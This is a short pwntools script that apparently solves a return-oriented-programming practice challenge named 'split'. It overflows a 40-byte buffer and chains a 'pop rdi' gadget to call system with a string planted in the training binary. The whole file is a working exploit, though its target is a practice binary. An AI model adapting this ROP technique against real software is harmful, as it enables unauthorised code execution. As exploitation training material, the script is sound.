#!/usr/bin/env python2
from pwn import *
context(arch='amd64', os='linux')

def pwn():

    e = ELF("./split")

    ''' Create buffer '''
    buf = 'A' * 40

    system_addr = e.symbols["usefulFunction"]
    system_call_addr = system_addr + 9
    system_call_addr = p64(system_call_addr)

    arg_addr = p64(e.symbols["usefulString"])
    pop_rdi = p64(0x0000000000400883) # ROP gadget: pop rdi; ret

    io = e.process()
    io.sendline(buf + pop_rdi + arg_addr + system_call_addr)
    print(io.recvall())

if __name__ == '__main__':
    pwn()
